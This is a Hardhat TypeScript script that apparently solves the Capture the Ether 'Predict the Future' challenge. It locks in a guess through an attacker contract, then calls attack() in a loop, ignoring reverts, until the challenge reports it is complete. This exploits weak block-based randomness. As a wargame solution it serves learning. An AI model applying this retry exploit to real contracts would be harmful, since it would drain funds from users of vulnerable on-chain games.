import { utils, PayableOverrides } from 'ethers';
import { ethers } from 'hardhat';
import { PredictTheFutureChallenge__factory } from '../../types/ethers-contracts';
import { handleError, getWallet } from '../utils';

const CHALLENGE_CONTRACT_ADDRESS = '0x7d8484FA7FA726547a2660E625D7f549c4Dd2279';
const ATTACKER_CONTRACT_ADDRESS = '0x847e4BD2A70F4DE94CB567d3dA36Ce46B00Ff9BF';

const main = async () => {
  const wallet = getWallet();

  const challenge = PredictTheFutureChallenge__factory.connect(
    CHALLENGE_CONTRACT_ADDRESS,
    wallet
  );

  const attacker = await ethers.getContractAt(
    'PredictTheFutureAttacker',
    ATTACKER_CONTRACT_ADDRESS,
    wallet
  );

  const overrides: PayableOverrides = {
    value: utils.parseEther('1'),
    gasLimit: '150000',
  };

  const attack = async () => {
    let isComplete = false;
    let receipt = {};

    await attacker.lockInGuess(1, overrides);

    while (!isComplete) {
      const tx = await attacker.attack({ gasLimit: '150000' });
      receipt = await tx.wait().catch(() => {
        console.log('Reverted. Continue.');
      });
      isComplete = await challenge.isComplete();
    }
    console.log('Finish:', receipt);
  };

  await attack();
};

main().catch(handleError);
